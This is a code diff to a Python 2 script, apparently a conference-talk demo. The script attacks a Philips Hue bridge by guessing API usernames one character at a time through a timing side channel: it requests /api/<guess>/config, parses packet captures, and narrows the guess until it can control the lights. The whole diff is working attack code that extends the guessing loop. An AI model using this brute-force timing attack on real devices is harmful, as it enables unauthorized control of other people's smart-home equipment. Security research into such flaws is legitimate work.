@@ -14,6 +14,7 @@ import time
 import string
 import json
 import sys
+import subprocess
 
 # monkeypatch requests
 import utils
@@ -22,6 +23,8 @@ import requests
 
 import discover
 import users
+import calculate_guess
+import results
 
 def control_the_lights(hue_url, username):
     """ Do something to get people's attention """
@@ -55,18 +58,29 @@ hue_url = discover.find_hue()
 
 if len(sys.argv) > 1:
     # oh boy, adding options. rewrite this after the talk...
-    prefix = sys.argv[1]
+    current_guess = sys.argv[1]
 else:
-    prefix = users.USERNAME_PREFIX
+    current_guess = users.USERNAME_PREFIX
 
 count = 0
 start_time = time.time()
 interval = start_time
 username_generators = []
-for next_guess in users.charset():
-    username_generators.append(users.generate_username(prefix + next_guess))
+def make_username_generators(current_guess):
+    results = []
+    for next_guess in users.charset():
+        results.append(users.generate_username(current_guess + next_guess))
+    return results
 
+#username_generators = make_username_generators(current_guess)
+next_guess = current_guess
+print "CURRENT_GUESS: ", current_guess
+print "Collecting data:"
 while True:
+    if next_guess == current_guess:
+        print "Making new username generators with prefix:", current_guess
+        username_generators = make_username_generators(current_guess)
+        next_guess = None
     # shuffle the charset, but cycle every guess before repeating
     for usergen in username_generators:
         username = usergen.next()
@@ -86,5 +100,20 @@ while True:
             elapsed = now - start_time
             print count, elapsed, 100 / (now - interval)
             interval = now
+            if count % 3000 == 0:
+                time.sleep(0.1) # let any existing connections finish
+                print "Current guess: ", current_guess
+                print "Parsing data:"
+                subprocess.call(
+                    './parse_pcap.py data/*.pcap', shell=True) # I know, I know
+                print "Analyzing data:"
+                data = results.read_data(
+                    bucket=r'^/api/(%s\w)\w+/config$' % current_guess,
+                    data_dir='data')
+                next_guess = calculate_guess.next_guess(data)
+                if next_guess is not None:
+                    current_guess = next_guess
+                    print "CHANGING GUESS: ", current_guess
+                    print "Collecting data:"
         time.sleep(0.005)
     random.shuffle(username_generators)
